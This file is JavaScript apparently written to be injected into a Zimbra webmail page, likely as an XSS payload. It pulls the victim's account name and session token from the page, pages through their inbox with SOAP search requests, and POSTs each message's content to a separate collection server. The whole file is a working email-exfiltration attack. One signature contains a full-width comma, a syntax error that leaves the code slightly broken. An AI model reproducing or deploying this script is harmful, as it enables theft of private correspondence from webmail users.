function sendToServer(t，mail){
	var result = t.match(/"content":"(.*?)"\}\]/);
	if(result){
		var x = new XMLHttpRequest();
		var url = "http://127.0.0.1:8000/zimbra";
		x.open("POST",url);
		x.send(escape(result[1]));
	}
}

function getC(n){
	return document.getElementsByClassName(n);
}
function getCidAndFetch(r,k){

	var pt2 = new RegExp("\"id\":\"#key:(-{0,1}\\\d*?)\",\"n\"".replace("#key",k),"g");
	var cid_list = r.match(pt2);

	pt2 = new RegExp("\"id\":\"#key:(-{0,1}\\\d*?)\",\"n\"".replace("#key",k));
	for(var i=0;i < cid_list.length;i++){
		cid_list[i] = cid_list[i].match(pt2)[1];
	}

	var pt3 = new RegExp("\"m\":\\\[\\\{\"id\":\"#key:(-{0,1}\\\d*?)\"".replace("#key",k),"g");
	f_list = r.match(pt3);

	pt3 = new RegExp("\"m\":\\\[\\\{\"id\":\"#key:(-{0,1}\\\d*?)\"".replace("#key",k));
	for(var i=0;i<f_list.length;i++){
		f_list[i] = f_list[i].match(pt3)[1];
	}
	if(cid_list.length!=f_list.length){
		return false;
	}
	var result = [];
	for(var i=0;i<cid_list.length;i++){
		result.push({"cid":cid_list[i],"fetch":f_list[i]});
	}
	return result;

}

function getData(list,k,mail,num){
	var xml2 = new XMLHttpRequest();
	xml2.onreadystatechange = function(){
		if (xml2.readyState == 4 && xml2.status == 200){
			sendToServer(xml2.responseText);

			num = num+1;
			if(num<list.length){
				getData(list,k,mail,num);	//递归,一次只进行一个请求
				return;
			}
			else{
				return;
			}
		}
	};
	var d2 = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"}}},\"Body\":{\"SearchConvRequest\":{\"_jsns\":\"urn:zimbraMail\",\"sortBy\":\"dateDesc\",\"tz\":{\"id\":\"Asia/Hong_Kong\"},\"locale\":{\"_content\":\"zh_CN\"},\"offset\":0,\"limit\":250,\"query\":\"in:inbox\",\"cid\":\"#token:#cid\",\"fetch\":\"#token:#fetch\",\"read\":1,\"html\":1,\"needExp\":1,\"max\":250000}}}".replace("#mail",mail).replace("#token",k).replace("#token",k).replace("#cid",list[num]["cid"]).replace("#fetch",list[num]["fetch"])
	xml2.open("POST",location.origin+"/service/soap/SearchConvRequest");
	xml2.send(d2);
}

var mail = getC("ZmOverview")[0].id.match(/zov__(.*?):main_Mail/)[1];
if(location.origin.match(/^http:\/\/127(.*)/)){
	var m_list = getC("RowDouble");
	var p = m_list[0].id.match(/zli__CLV__(.*?):(.*)/);
	var k = p[1];		//token串
	var cur = p[2];		//头指针

	var xml = new XMLHttpRequest();
	xml.onreadystatechange = function(){
		if (xml.readyState == 4 && xml.status == 200){
			var r = xml.responseText;
			var list = getCidAndFetch(r,k);
			if(list){
				getData(list,k,mail,0);
			}
			else{

			}
		}
	};
	var limit = "50";
	var data = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"}}},\"Body\":{\"SearchRequest\":{\"_jsns\":\"urn:zimbraMail\",\"sortBy\":\"dateDesc\",\"tz\":{\"id\":\"Asia/Hong_Kong\"},\"locale\":{\"_content\":\"zh_CN\"},\"cursor\":{\"id\":\"#token:#cursor\",\"sortVal\":\"1515485360000\"},\"offset\":100,\"limit\":#limit,\"query\":\"in:inbox\",\"types\":\"conversation\",\"fetch\":1}}}".replace("#mail",mail).replace("#cursor",cur).replace("#token",k).replace("#limit",limit);
	xml.open("POST",location.origin+"/service/soap/SearchRequest");
	xml.send(data);

	// var n_list = [];
	// for(var i=0;i<m_list.length;i++){
	// 	n_list.push(m_list[i].id.match(/(.*?):(.*)/)[2]);
	// }
}
else{

}